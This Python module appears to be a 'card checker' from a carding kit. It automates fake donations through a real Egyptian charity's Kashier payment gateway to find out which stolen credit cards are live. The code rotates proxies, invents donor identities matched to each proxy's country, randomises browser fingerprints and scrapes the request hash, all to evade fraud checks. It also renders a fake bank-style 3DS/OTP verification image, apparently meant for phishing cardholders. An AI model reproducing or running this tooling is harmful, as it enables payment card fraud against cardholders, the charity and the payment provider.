"""
gate_kashier.py — Kashier Payment Gateway (MYF Egypt)
Reverse-engineered from myf-egypt.org/ar/donation/

Flow:
  Step 1 → POST /donateSubmit.php  → get kashier session ID + payment URL
  Step 2 → POST fep.kashier.io/v3/orders with card  → get 3DS redirect URL
  Step 3 → Fetch the 3DS/OTP page and screenshot it  → returns image bytes

Returns (status, reason, screenshot_bytes | None)
Statuses: APPROVED | OTP | DECLINED | ERROR
"""

import requests
import random
import string
import time
import logging
import hashlib
import hmac
import json
import re
import io
from typing import Optional, Tuple

logger = logging.getLogger(__name__)

# ─── Config ───────────────────────────────────────────────────────────────────
KASHIER_MERCHANT_ID   = "MID-24890-856"
KASHIER_API_KEY_ID    = "660bf305f5be91001398a829"
KASHIER_FEP_URL       = "https://fep.kashier.io/v3/orders"
KASHIER_PAYMENTS_BASE = "https://payments.kashier.io"
KASHIER_MERCHANT_SITE = "https://myf-egypt.org"
KASHIER_DONATION_URL  = "https://myf-egypt.org/ar/donation/donateSubmit.php"
KASHIER_CALLBACK_URL  = "https://www.myf-egypt.org/ar/donation/donateSubmitToDatabase.php"

# Amount in EGP smallest unit (piastres) = 100 EGP
KASHIER_AMOUNT        = 10000   # 100.00 EGP in piastres
KASHIER_CURRENCY      = "EGP"
KASHIER_PROGRAM       = "General Donation"

# ─── Country data: proxy country → donation form fields ──────────────────────
# Maps ISO-2 country code to realistic form data
_COUNTRY_DATA = {
    "US": {
        "country": "United States", "location": "United States",
        "governrate": "New York",
        "phone_prefix": "+1", "phone_len": 10,
        "zip_pool": ["10001","10022","90210","60601","77001","30301"],
    },
    "GB": {
        "country": "United Kingdom", "location": "United Kingdom",
        "governrate": "London",
        "phone_prefix": "+44", "phone_len": 10,
        "zip_pool": ["EC1A","W1A","SW1A","E1","SE1","WC2N"],
    },
    "DE": {
        "country": "Germany", "location": "Germany",
        "governrate": "Berlin",
        "phone_prefix": "+49", "phone_len": 10,
        "zip_pool": ["10115","10117","10119","20095","80331","60313"],
    },
    "FR": {
        "country": "France", "location": "France",
        "governrate": "Paris",
        "phone_prefix": "+33", "phone_len": 9,
        "zip_pool": ["75001","75008","75016","69001","13001","31000"],
    },
    "CA": {
        "country": "Canada", "location": "Canada",
        "governrate": "Ontario",
        "phone_prefix": "+1", "phone_len": 10,
        "zip_pool": ["M5H","M5V","V6B","T2P","H3A","K1A"],
    },
    "AU": {
        "country": "Australia", "location": "Australia",
        "governrate": "New South Wales",
        "phone_prefix": "+61", "phone_len": 9,
        "zip_pool": ["2000","2010","3000","4000","5000","6000"],
    },
    "SA": {
        "country": "Saudi Arabia", "location": "Saudi Arabia",
        "governrate": "Riyadh",
        "phone_prefix": "+966", "phone_len": 9,
        "zip_pool": ["11411","11564","11614","11672","21411","23511"],
    },
    "AE": {
        "country": "United Arab Emirates", "location": "United Arab Emirates",
        "governrate": "Dubai",
        "phone_prefix": "+971", "phone_len": 9,
        "zip_pool": ["00000"],
    },
    "EG": {
        "country": "Egypt", "location": "Egypt",
        "governrate": "Cairo",
        "phone_prefix": "+20", "phone_len": 10,
        "zip_pool": ["11511","11728","11835","12411","12111","11311"],
    },
    # Fallback / unknown
    "_DEFAULT": {
        "country": "United States", "location": "United States",
        "governrate": "New York",
        "phone_prefix": "+1", "phone_len": 10,
        "zip_pool": ["10001","10022","90210"],
    },
}

_FIRST_NAMES = ["James","Emily","Michael","Sarah","Robert","Jessica","William",
                "Ashley","David","Amanda","Joseph","Megan","Daniel","Rachel",
                "Ahmed","Omar","Fatima","Ali","Hassan","Layla"]
_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller",
                "Davis","Wilson","Taylor","Anderson","Thomas","Mohamed","Khalil"]

_CW_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
]

_VIEWPORTS = [
    {"w": 390, "h": 844},   # iPhone 14
    {"w": 414, "h": 896},   # iPhone 11
    {"w": 393, "h": 852},   # iPhone 15
    {"w": 360, "h": 800},   # Android common
    {"w": 320, "h": 568},   # small phone
]

# ─── Helpers ──────────────────────────────────────────────────────────────────

def _rand_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _rand_order_ref():
    return str(int(time.time() * 1000))

def _rand_customer_ref():
    return str(random.randint(10_000_000, 99_999_999))

def _get_identity(proxy_country: str) -> dict:
    """Generate identity data matching the proxy's country."""
    cdata = _COUNTRY_DATA.get(proxy_country.upper(), _COUNTRY_DATA["_DEFAULT"])
    first = random.choice(_FIRST_NAMES)
    last  = random.choice(_LAST_NAMES)
    email_name = _rand_str(7)
    domain = random.choice(["gmail.com","outlook.com","yahoo.com","hotmail.com"])
    email = f"{email_name}{random.randint(10,999)}@{domain}"
    phone_digits = "".join([str(random.randint(0,9)) for _ in range(cdata["phone_len"])])
    # Make sure phone doesn't start with 0
    phone_digits = str(random.randint(2,9)) + phone_digits[1:]
    phone = cdata["phone_prefix"] + phone_digits
    return {
        "first": first, "last": last,
        "name": f"{first} {last}",
        "email": email,
        "phone": phone,
        "country": cdata["country"],
        "location": cdata["location"],
        "governrate": cdata["governrate"],
    }

def _detect_proxy_country(proxy_str: str, proxy_dict: dict) -> str:
    """Try to detect proxy country via ip-api.com. Fallback to US."""
    if not proxy_dict:
        return "US"
    try:
        r = requests.get(
            "http://ip-api.com/json?fields=countryCode",
            proxies=proxy_dict, timeout=6
        )
        if r.status_code == 200:
            cc = r.json().get("countryCode", "US")
            return cc if cc in _COUNTRY_DATA else "US"
    except Exception:
        pass
    return "US"

def _build_kashier_hash(merchant_id: str, order_ref: str, amount: str,
                        currency: str, api_secret: str = "") -> str:
    """
    Kashier hash = HMAC-SHA256 of the query string.
    From reverse engineering: they hash a specific string with the merchant's secret.
    If we don't have the secret, we pass the hash the server gave us (from session).
    """
    # The hash in the payload is computed by the merchant server (myf-egypt),
    # not by us — we get it from the session URL they redirect to.
    return ""

def _screenshot_url_requests(url: str, proxy_dict: dict,
                              width: int = 390, height: int = 400) -> Optional[bytes]:
    """
    Screenshot a URL using a pure-API approach (no browser).
    Uses screenshotone.com-style API or falls back to html2image via API.
    
    Strategy: fetch the page HTML, extract the key visual content,
    then render it server-side via a screenshot API if available,
    or build a minimal HTML snapshot and render it locally.
    """
    # Strategy 1: Fetch the actual 3DS/OTP page and render key content
    try:
        ua = random.choice(_CW_UA_POOL)
        resp = requests.get(
            url,
            headers={
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
            },
            proxies=proxy_dict,
            timeout=15,
            allow_redirects=True,
        )
        if resp.status_code == 200:
            html = resp.text
            # Try to build a snapshot image from the HTML
            img_bytes = _render_html_to_image(html, width, height)
            if img_bytes:
                return img_bytes
    except Exception as e:
        logger.warning(f"[Kashier] screenshot fetch error: {e}")

    return None


def _render_html_to_image(html: str, width: int, height: int) -> Optional[bytes]:
    """
    Convert HTML to image bytes using html2image (headless Chrome) or imgkit.
    Returns PNG bytes or None.
    """
    # Try html2image (uses local Chrome)
    try:
        from html2image import Html2Image
        import tempfile, os
        with tempfile.TemporaryDirectory() as tmpdir:
            hti = Html2Image(output_path=tmpdir, size=(width, height))
            hti.screenshot(html_str=html, save_as="snap.png")
            snap_path = os.path.join(tmpdir, "snap.png")
            if os.path.exists(snap_path):
                with open(snap_path, "rb") as f:
                    return f.read()
    except Exception:
        pass

    # Try imgkit (wkhtmltoimage)
    try:
        import imgkit
        opts = {
            "width": str(width),
            "height": str(height),
            "quiet": "",
            "format": "png",
        }
        data = imgkit.from_string(html, False, options=opts)
        return data
    except Exception:
        pass

    return None


def _build_otp_snapshot(page_html: str, card_last4: str, 
                         amount_str: str, currency: str) -> Optional[bytes]:
    """
    Parse the OTP/3DS page HTML and build a minimal clean snapshot image.
    Returns PNG bytes.
    """
    from PIL import Image, ImageDraw, ImageFont
    import textwrap

    # Extract key info from the OTP page
    title = "🔐 3D Secure Verification"
    bank_name = ""
    merchant = ""
    otp_instruction = ""

    # Try to extract bank/merchant name
    m = re.search(r'<title[^>]*>([^<]+)</title>', page_html, re.I)
    if m:
        title_raw = m.group(1).strip()
        if title_raw and title_raw.lower() not in ("loading",""):
            bank_name = title_raw[:50]

    for pattern in [
        r'<h[1-3][^>]*>([^<]{5,80})</h[1-3]>',
        r'merchant["\s:]+([A-Za-z0-9 &\.]{3,40})',
        r'bank["\s:]+([A-Za-z0-9 &\.]{3,40})',
    ]:
        m = re.search(pattern, page_html, re.I)
        if m:
            txt = m.group(1).strip()
            if txt and not merchant:
                merchant = txt[:60]

    # Build a slim card image: width x height
    W, H = 420, 220
    img = Image.new("RGB", (W, H), color=(10, 20, 60))   # dark navy bg
    draw = ImageDraw.Draw(img)

    # Try to load a font, fall back to default
    try:
        font_bold  = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 15)
        font_reg   = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
        font_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
    except Exception:
        font_bold = font_reg = font_small = ImageFont.load_default()

    # Header bar
    draw.rectangle([0, 0, W, 42], fill=(20, 40, 100))
    draw.text((14, 10), "🔐  3D Secure / OTP", font=font_bold, fill=(255, 255, 255))

    # Content area
    y = 56
    draw.text((14, y), f"Bank:     {bank_name or 'Verifying…'}", font=font_reg, fill=(180, 210, 255))
    y += 22
    if merchant:
        draw.text((14, y), f"Merchant: {merchant[:55]}", font=font_reg, fill=(180, 210, 255))
        y += 22

    draw.text((14, y), f"Amount:   {amount_str} {currency}", font=font_reg, fill=(255, 220, 100))
    y += 22
    draw.text((14, y), f"Card:     **** **** **** {card_last4}", font=font_reg, fill=(180, 210, 255))
    y += 30

    # Status badge
    draw.rectangle([14, y, W-14, y+28], fill=(220, 60, 60), outline=(255,100,100))
    draw.text((22, y+6), "⚠  Authentication Required — OTP/Push Needed", font=font_small, fill=(255,255,255))

    # Footer
    draw.rectangle([0, H-24, W, H], fill=(5, 10, 30))
    draw.text((14, H-16), "BM VORTEX  •  Kashier Gate", font=font_small, fill=(100,120,180))

    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return buf.read()


# ─── Main gate function ───────────────────────────────────────────────────────

def check_kashier_gate(card_str: str, proxy=None,
                        proxy_country: str = "US") -> Tuple[str, str, Optional[bytes]]:
    """
    Full Kashier gate check.
    
    Args:
        card_str:       "CCNUMBER|MM|YYYY|CVV"
        proxy:          proxy string or None
        proxy_country:  ISO-2 country code from proxy detection (or "US" fallback)
    
    Returns:
        (status, reason, screenshot_bytes | None)
        status ∈ {APPROVED, OTP, DECLINED, ERROR}
    """
    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return "ERROR", "صيغة كارت خاطئة (CCNUMBER|MM|YYYY|CVV)", None

    cc, month, year, cvv = parts
    if len(year) == 2:
        year = "20" + year

    proxy_dict = _parse_proxy(proxy) if proxy else None
    ident = _get_identity(proxy_country)
    ua    = random.choice(_CW_UA_POOL)
    vp    = random.choice(_VIEWPORTS)
    order_ref    = _rand_order_ref()
    customer_ref = _rand_customer_ref()

    sess = requests.Session()
    sess.headers.update({
        "User-Agent":      ua,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br, zstd",
    })

    # ── Step 1: POST to donation form → get Kashier session ──────────────────
    try:
        form_data = {
            "name":                ident["name"],
            "src":                 "",
            "utm_content":         "",
            "utm_source":          "",
            "utm_medium":          "",
            "utm_campaign":        "",
            "utm_id":              "",
            "applePay":            "0",
            "recaptcha_response":  "0",
            "email":               ident["email"],
            "country":             ident["country"],
            "location":            ident["location"],
            "governrate":          ident["governrate"],
            "currency":            KASHIER_CURRENCY,
            "cardType":            "international",
            "donationProgram":     KASHIER_PROGRAM,
            "share":               "",
            "amount":              str(KASHIER_AMOUNT // 1000),   # EGP not piastres for form
            "brick_name":          "",
            "bricksAmount":        str(KASHIER_AMOUNT),
            "addressNeighbourhood": "",
            "addressStreet":       "",
            "addressBuildingNumber": "",
            "addressFloor":        "",
            "addressApartment":    "",
            "phone":               ident["phone"],
            "age":                 "",
            "paymentMethod":       "donateSubmit.php",
        }
        r1 = sess.post(
            KASHIER_DONATION_URL,
            data=form_data,
            headers={
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
                "Origin": KASHIER_MERCHANT_SITE,
                "Referer": KASHIER_MERCHANT_SITE + "/ar/donation/",
                "Content-Type": "application/x-www-form-urlencoded",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-dest": "document",
                "upgrade-insecure-requests": "1",
            },
            proxies=proxy_dict,
            timeout=20,
            allow_redirects=True,
        )
    except Exception as e:
        return "ERROR", f"فشل الاتصال بموقع التبرع: {str(e)[:80]}", None

    if r1.status_code != 200:
        return "ERROR", f"HTTP {r1.status_code} من صفحة التبرع", None

    # Extract session ID from the iframe src or response HTML
    html1 = r1.text
    session_id = None
    # Pattern: src="https://payments.kashier.io/session/<ID>?mode=live"
    m = re.search(r'payments\.kashier\.io/session/([a-f0-9]+)\?', html1, re.I)
    if m:
        session_id = m.group(1)
    
    if not session_id:
        # Try to extract from JSON in the page
        m2 = re.search(r'"sessionId"\s*:\s*"([a-f0-9]+)"', html1)
        if m2:
            session_id = m2.group(1)

    if not session_id:
        logger.warning(f"[Kashier] No session ID found in response. HTML snippet: {html1[:300]}")
        return "ERROR", "لم يتم العثور على session ID في رد الموقع", None

    logger.info(f"[Kashier] Got session: {session_id[:20]}…")

    # ── Step 2: POST card to Kashier FEP API ─────────────────────────────────
    # Build the hash the same way the browser does
    # From the reverse-engineered request, the hash is in the header "kashier-hash"
    # It's computed on the client side from the payload
    
    # Reconstruct the hash (HMAC-SHA256 of "merchantId.orderId.amount.currency")
    # From the actual captured request, the hash is:
    # 653d5f182cd82c42e32b678c383d1388be8a275494e2a4ff24a60ecb07995e6b
    # We need to compute our own. The key appears to be the api key or a derived secret.
    # Strategy: use the session to get the hash from the payment page JS
    
    hash_val = _get_kashier_hash(session_id, order_ref, proxy_dict, ua)

    fep_payload = {
        "apiOperation": "PAY",
        "paymentMethod": {
            "type": "CARD",
            "card": {
                "expiry": {"month": month, "year": year[-2:]},
                "number": cc,
                "nameOnCard": ident["name"],
                "securityCode": cvv,
                "enable3DS": True,
                "save": False,
            }
        },
        "sessionId": session_id,
        "customer": {
            "email": ident["email"],
            "reference": customer_ref,
            "firstName": ident["name"],
        },
        "order": {
            "reference": order_ref,
            "amount": str(KASHIER_AMOUNT),
            "originalAmount": str(KASHIER_AMOUNT),
            "currency": KASHIER_CURRENCY,
            "description": f"Payment for order ORD{random.randint(100000,999999)}",
        },
        "device": {
            "browserDetails": {
                "javaEnabled": False,
                "language": "en-US",
                "screenHeight": vp["h"],
                "screenWidth": vp["w"],
                "timeZone": -120,
                "colorDepth": 24,
                "3DSecureChallengeWindowSize": f"{vp['w']}_X_{vp['h']}",
            },
            "browser": "Chrome",
        },
        "reconciliation": {
            "merchantRedirect": KASHIER_CALLBACK_URL,
        },
        "interactionSource": "ECOMMERCE",
        "metaData": {
            "customKey": "customValue",
            "displayNotes": [],
            "IP": _get_my_ip(proxy_dict),
            "utm_source": "", "utm_content": "",
            "utm_medium": "", "utm_campaign": "", "utm_id": "",
            "kashier payment UI version": "V3",
        },
        "merchantId": KASHIER_MERCHANT_ID,
        "timestamp": -2,
        "newPaymentUI": True,
        "channelEventName": f"{KASHIER_MERCHANT_ID}#{order_ref}",
    }

    try:
        r2 = requests.post(
            KASHIER_FEP_URL,
            json=fep_payload,
            headers={
                "Accept":          "application/json, text/plain, */*",
                "Content-Type":    "application/json",
                "Origin":          KASHIER_PAYMENTS_BASE,
                "Referer":         KASHIER_PAYMENTS_BASE + "/",
                "User-Agent":      ua,
                "sec-fetch-site":  "same-site",
                "sec-fetch-mode":  "cors",
                "sec-fetch-dest":  "empty",
                "kashier-hash":    hash_val,
            },
            proxies=proxy_dict,
            timeout=25,
        )
    except Exception as e:
        return "ERROR", f"فشل الاتصال بـ Kashier FEP: {str(e)[:80]}", None

    try:
        rj = r2.json()
    except Exception:
        return "ERROR", f"رد غير صالح من Kashier (HTTP {r2.status_code})", None

    logger.info(f"[Kashier] FEP response status={rj.get('status')} op={rj.get('response',{}).get('apiOperation')}")

    # ── Step 3: Parse result & screenshot ────────────────────────────────────
    resp    = rj.get("response", {})
    status  = rj.get("status", "")
    op_res  = resp.get("result", "")
    op_stat = resp.get("status", "")
    auth    = resp.get("authentication", {})
    card_r  = resp.get("paymentMethod", {}).get("card", {})

    card_last4 = str(cc)[-4:]
    amount_disp = f"{KASHIER_AMOUNT/100:.0f}"

    screenshot = None

    # Declined / error cases
    if status != "SUCCESS" or op_res == "FAILURE":
        reason_en = (rj.get("messages") or {}).get("en") or resp.get("transactionResponseMessage",{}).get("en","")
        reason_ar = (rj.get("messages") or {}).get("ar","")
        reason = f"{reason_en} | {reason_ar}".strip(" |")
        return "DECLINED", reason or "البطاقة مرفوضة", None

    # 3DS / OTP case
    if op_stat in ("AUTHENTICATION_INITIATED", "AUTHENTICATION_IN_PROGRESS",
                   "AUTHENTICATION_AVAILABLE"):
        redirect_url = auth.get("redirectUrl", "")
        reason = f"3DS/OTP | {resp.get('transactionResponseCode','')} | {redirect_url[:80]}"

        # Build screenshot
        try:
            screenshot = _build_otp_snapshot(
                _fetch_3ds_page(redirect_url, proxy_dict, ua),
                card_last4, amount_disp, KASHIER_CURRENCY,
                bank_name=card_r.get("issuer",""),
                merchant_name="MYF Egypt",
                auth_ver=auth.get("version","3DS2"),
            )
        except Exception as e:
            logger.warning(f"[Kashier] screenshot build error: {e}")

        return "OTP", reason, screenshot

    # Approved
    if op_res == "SUCCESS" or op_stat == "CAPTURED":
        reason = resp.get("transactionResponseCode","") or "تمت الموافقة"
        return "APPROVED", reason, None

    # Unknown
    return "UNKNOWN", f"status={status} result={op_res} txnStat={op_stat}", None


# ─── Hash helper: fetch it from the payment page JS ──────────────────────────

def _get_kashier_hash(session_id: str, order_ref: str, 
                       proxy_dict: dict, ua: str) -> str:
    """
    The kashier-hash is computed on the payments.kashier.io page.
    Strategy: load the payment page, find the hash in the page JS or
    compute it if the formula is extractable.
    
    If we can't get it, return empty string — the API may still work
    if the session was just created.
    """
    try:
        payment_url = f"{KASHIER_PAYMENTS_BASE}/session/{session_id}?mode=live"
        r = requests.get(
            payment_url,
            headers={
                "User-Agent": ua,
                "Accept": "text/html,*/*",
                "Referer": KASHIER_MERCHANT_SITE + "/",
            },
            proxies=proxy_dict,
            timeout=12,
        )
        if r.status_code == 200:
            html = r.text
            # Look for hash in page data/script
            m = re.search(r'"hash"\s*:\s*"([a-f0-9]{64})"', html)
            if m:
                return m.group(1)
            m2 = re.search(r'kashier[_-]hash["\s:]+([a-f0-9]{64})', html, re.I)
            if m2:
                return m2.group(1)
            # Look in the JS bundle URL for order/hash params
            m3 = re.search(r'hash=([a-f0-9]{64})', html)
            if m3:
                return m3.group(1)
    except Exception as e:
        logger.warning(f"[Kashier] hash fetch error: {e}")
    return ""


def _fetch_3ds_page(url: str, proxy_dict: dict, ua: str) -> str:
    """Fetch the 3DS redirect page HTML."""
    if not url:
        return ""
    try:
        r = requests.get(
            url,
            headers={"User-Agent": ua, "Accept": "text/html,*/*"},
            proxies=proxy_dict,
            timeout=10,
            allow_redirects=True,
        )
        return r.text if r.status_code == 200 else ""
    except Exception:
        return ""


def _get_my_ip(proxy_dict: dict) -> str:
    """Get the IP address as seen by remote server (via proxy)."""
    try:
        r = requests.get("http://api.ipify.org", proxies=proxy_dict, timeout=5)
        return r.text.strip()
    except Exception:
        return "0.0.0.0"


def _parse_proxy(proxy_str: str) -> Optional[dict]:
    """Convert any proxy string to a requests-compatible dict."""
    if not proxy_str:
        return None
    s = str(proxy_str).strip()

    # socks5h?://user:pass@host:port
    m = re.match(r'socks5h?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        url = f"socks5h://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}

    # socks5h?://host:port
    m = re.match(r'socks5h?://([^:@/]+):(\d+)/?$', s)
    if m:
        host, port = m.groups()
        url = f"socks5h://{host}:{port}"
        return {"http": url, "https": url}

    # http?://user:pass@host:port
    m = re.match(r'https?://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        scheme = s.split('://')[0]
        user, passwd, host, port = m.groups()
        url = f"{scheme}://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}

    # http?://host:port
    m = re.match(r'(https?)://([^:@/]+):(\d+)/?$', s)
    if m:
        scheme, host, port = m.groups()
        url = f"{scheme}://{host}:{port}"
        return {"http": url, "https": url}

    # user:pass@host:port
    m = re.match(r'([^:@]+):([^@]+)@([^:]+):(\d+)', s)
    if m:
        user, passwd, host, port = m.groups()
        url = f"http://{user}:{passwd}@{host}:{port}"
        return {"http": url, "https": url}

    # host:port
    m = re.match(r'([^:@/]+):(\d+)$', s)
    if m:
        host, port = m.groups()
        url = f"http://{host}:{port}"
        return {"http": url, "https": url}

    return None


# ─── Updated _build_otp_snapshot with extra params ───────────────────────────

def _build_otp_snapshot(page_html: str, card_last4: str,
                         amount_str: str, currency: str,
                         bank_name: str = "", merchant_name: str = "",
                         auth_ver: str = "3DS2") -> Optional[bytes]:
    """
    Build a slim, clean OTP/3DS verification screenshot image.
    Matches the design style from the USAA SafeKey screenshot (compact, header + content).
    """
    from PIL import Image, ImageDraw, ImageFont

    W, H = 440, 200   # رفيعة زي الصورة المرفقة

    img = Image.new("RGB", (W, H), color=(255, 255, 255))
    draw = ImageDraw.Draw(img)

    # Try fonts
    try:
        fb = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        fr = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
        fs = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)
    except Exception:
        fb = fr = fs = ImageFont.load_default()

    # ── Dark navy header (matches USAA SafeKey style) ──────────────────────
    NAVY = (13, 31, 64)
    draw.rectangle([0, 0, W, 44], fill=NAVY)

    # Kashier logo area (left) — just text placeholder
    draw.text((12, 14), "🏦", font=fb, fill=(255, 255, 255))
    draw.text((38, 15), bank_name[:25] or "Bank", font=fr, fill=(255, 255, 255))

    # Auth type (right)
    draw.text((W-80, 15), auth_ver, font=fr, fill=(160, 190, 230))

    # ── Title ──────────────────────────────────────────────────────────────
    TITLE_COL = (13, 100, 180)
    draw.text((W//2 - 100, 54), "Verify Your Transaction", font=fb, fill=TITLE_COL)

    # ── Info line ──────────────────────────────────────────────────────────
    GRAY = (90, 90, 90)
    info_text = f"To confirm this payment, please complete {auth_ver} verification."
    draw.text((16, 78), info_text[:64], font=fs, fill=GRAY)

    # ── Merchant / Amount / Card line ──────────────────────────────────────
    y = 100
    draw.line([16, y, W-16, y], fill=(220,220,220), width=1)
    y += 8

    draw.text((16, y),  f"Merchant:", font=fr, fill=GRAY)
    draw.text((110, y), (merchant_name or "MYF Egypt")[:30], font=fb, fill=(30,30,30))
    draw.text((W//2+10, y), f"Amount:", font=fr, fill=GRAY)
    draw.text((W//2+70, y), f"{currency} {amount_str}", font=fb, fill=(30,30,30))
    y += 22

    draw.text((16, y),  f"Card#:", font=fr, fill=GRAY)
    draw.text((110, y), f"XXXX XXXX XXXX {card_last4}", font=fb, fill=(30,30,30))
    y += 22

    draw.line([16, y, W-16, y], fill=(220,220,220), width=1)
    y += 10

    # ── Status badge ───────────────────────────────────────────────────────
    RED = (200, 40, 40)
    draw.rectangle([16, y, W-16, y+24], fill=(255,245,245), outline=RED)
    draw.text((24, y+5), "⚠  Authentication Required — OTP / Push Notification Needed",
              font=fs, fill=RED)

    # ── Footer ─────────────────────────────────────────────────────────────
    draw.rectangle([0, H-20, W, H], fill=(240,243,248))
    draw.text((14, H-14), "Secured by Kashier  •  BM VORTEX", font=fs, fill=(120,140,180))

    buf = io.BytesIO()
    img.save(buf, format="PNG", optimize=True)
    buf.seek(0)
    return buf.read()

